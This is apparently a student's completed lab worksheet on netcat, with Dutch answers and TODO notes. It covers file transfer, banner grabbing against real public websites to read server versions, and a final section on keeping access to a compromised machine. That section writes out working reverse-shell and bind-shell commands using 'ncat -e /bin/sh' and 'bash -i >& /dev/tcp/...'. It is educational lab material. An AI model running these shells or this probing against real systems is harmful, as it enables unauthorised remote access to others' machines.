3. Stop the listening netcat command and adjust it so that it can receive a file and store it into `received.txt`. Now use netcat in the other terminal to send the file. After you have received the file, check if the SHA256 value of `received.txt` corresponds with that of `test.txt`. Hint: http://www.microhowto.info/howto/copy_a_file_from_one_machine_to_another_using_netcat
    ```console
    $ nc -l 11337 > received.txt
    ```
    ```console
    $ nc localhost 11337 < test.txt
    ```
    ```console
    $ sha256sum test.txt
    64c167319c933591cb387875d819f5156e60fb66dc673996be2f83c150c38418  test.txt
    $ sha256sum received.txt
    64c167319c933591cb387875d819f5156e60fb66dc673996be2f83c150c38418  received.txt
    ```
    
4. It is possible to send a file from the listening netcat command to the client netcat command. Try this out. What difference do you notice? How can you solve this?
    ```
    Het is mogelijk, enkel de redirection operators moeten omgedraaid worden.

    TODO: is het zo eenvoudig??
    ```
    ```console
    $ nc -l 11337 < received.txt
    ```
    ```console
    $ nc localhost 11337 > received2.txt
    ```
    ```console
    $ sha256sum received2.txt
    64c167319c933591cb387875d819f5156e60fb66dc673996be2f83c150c38418  received2.txt
    $ sha256sum received.txt
    64c167319c933591cb387875d819f5156e60fb66dc673996be2f83c150c38418  received.txt
    ```

### Netcat - Banner grabbing
1. netcat can be used to interrogate a port to detect which service is running on that port. With `netcat`, we can try to pry a response from this port and thus detect the service behind it. This is called "banner grabbing". Connect to http://opcafegaan.be and just send some random input. Do you get a response? What can you learn from this response?
    ```console
    $ nc opcafegaan.be 80
    test
    HTTP/1.1 400 Bad Request
    Server: nginx/1.10.3
    Date: Wed, 05 Dec 2021 19:47:16 GMT
    Content-Type: text/html
    Content-Length: 173
    Connection: close

    <html>
    <head><title>400 Bad Request</title></head>
    <body bgcolor="white">
    <center><h1>400 Bad Request</h1></center>
    <hr><center>nginx/1.10.3</center>
    </body>
    </html>

    ```
    ```
    Het is een nginx webserver version 1.10.3
    ```

2. How can you use netcat as an HTTP client? Try to retrieve the page from http://scouts.be . Try using both HTTP/1.0 and HTTP/1.1 .
    ```console
    $ nc scouts.be 80
    GET / HTTP/1.0
    Host: scouts.be

    HTTP/1.1 301 Moved Permanently
    Content-Type: text/html; charset=UTF-8
    Location: https://scouts.be/
    Date: Wed, 05 Dec 2021 19:49:58 GMT
    Connection: close
    Content-Length: 0

    ```
    ```console
    $ nc scouts.be 80
    GET / HTTP/1.1
    Host: scouts.be

    HTTP/1.1 301 Moved Permanently
    Content-Type: text/html; charset=UTF-8
    Location: https://scouts.be/
    Date: Wed, 05 Dec 2021 19:50:56 GMT
    Content-Length: 0

    ```

3. As you can see, the page has moved to HTTPS. Luckily, ncat has support for SSL. How can you get the page through HTTPS? What do you see in the response? Can you learn which OS is used on the server, and which environment is used to program the website?
    ```console
    $ ncat --ssl scouts.be 443
    GET / HTTP/1.1
    Host: scouts.be

    HTTP/1.1 302 Found
    Content-Type: text/html; charset=UTF-8
    Location: http://guiding-scouting.be/
    Server: Microsoft-IIS/10.0
    X-Powered-By: PHP/7.3.29
    X-Powered-By: ASP.NET
    Set-Cookie: ARRAffinity=3f2172767c4e6c3dbda08cf9b2c8a2d19aba675d62af7c7ed63b89c940e40a8b;Path=/;HttpOnly;Secure;Domain=scouts.be
    Set-Cookie: ARRAffinitySameSite=3f2172767c4e6c3dbda08cf9b2c8a2d19aba675d62af7c7ed63b89c940e40a8b;Path=/;HttpOnly;SameSite=None;Secure;Domain=scouts.be
    Date: Wed, 05 Dec 2021 19:54:11 GMT
    Content-Length: 0

    ```
    ```
    OS: Windows server (ISS draait niet op Linux)
    Environment: ASP.NET & PHP
    ```

4. We still haven't got the actual page, from the status code you got in the previous question, how can we retrieve this? See https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302 for more information.
    ```console
    $ ncat --ssl scouts.be 443
    GET / HTTP/1.1
    Host: guiding-scouting.be
    [...]
    ```

### Reverse and bind shells shell
After you have gained access to someones machine, you like to keep exploiting that machine. There are 2 possible ways to do this with `netcat`:
- Reverse shells
- Bind shells

See https://www.infosecademy.com/netcat-reverse-shells/ for more information on the difference.

#### Reverse shells
When implementing a reverse shell, the attacking machine listens to a connection from the compromised victim machine. Open up 2 terminals: one is the attacker machine and the other the victim machine. Can you create a reverse shell? Even tough you don't see a prompt, you can execute bash commands in the attacker terminal. Try it out with commands like `cd`, `ls` and `cat`.

*Attacker*
```console
$ ncat -l -p 31337
```
1. If you are on a victim terminal, how can you connect to the above socket and give yourself as an attacker a shell on this node?

    *Target*
    ```console
    $ ncat -v localhost 31337 -e /bin/sh
    ```

2. What if the victim terminal doesn't have nmap installed? Can you open a reverse shell using bash on the victim terminal?
    ```
    TODO: nmap? Moet dit geen ncat zijn?
    ```
    ```console
    $ bash -i >& /dev/tcp/127.0.0.1/31337 0>&1
    ```
    
    

#### Bind shell
With a bind shell, the victim machine listens to a connection from the attacking machine. Again, open up 2 terminals: one is the attacker machine and the other the victim machine. Can you create a bind shell?

*Target*
```console
$ ncat -l -p 31337 -e /bin/sh
```
*Attacker*
```console
$ ncat -v localhost 31337
```

Extra: It is even possible to use reverse or bind shells between Windows and Linux machines. Once you gained access to the victim machine, you can create users and change permissions. See https://subscription.packtpub.com/book/networking-and-servers/9781849519960/1/ch01lvl1sec06/top-3-features-youll-want-to-know-about for more information.